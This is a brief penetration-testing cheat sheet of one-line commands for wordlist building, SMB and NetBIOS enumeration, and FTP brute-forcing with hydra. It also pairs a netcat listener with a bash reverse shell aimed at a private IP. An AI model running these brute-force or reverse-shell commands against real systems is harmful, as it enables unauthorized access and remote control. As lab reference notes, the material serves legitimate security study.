---
title:  "Various uncategorized utilities"
topic: "unsorted"
---

* Decode base64: `echo ‘base64 encoded text’ | base64 -d`
* Create a dictionary from words on a webpage: `cewl http://test.com -w /root/tmp/dict.txt`
* FTP bruteforce: `hydra -L dict.txt -P dict.txt 192.168.1.104 ftp`
* Netbios name scanner: `nbtscan $IP`
* `rpcclient -U "user" $IP`
* `enum4linux $IP`


# Connections
* Netcat and bash redirection:
  - Attacker: `nc -nlvp 4444`
  - Victim: `bash -i >& /dev/tcp/192.168.33.129/4444 0>&1`
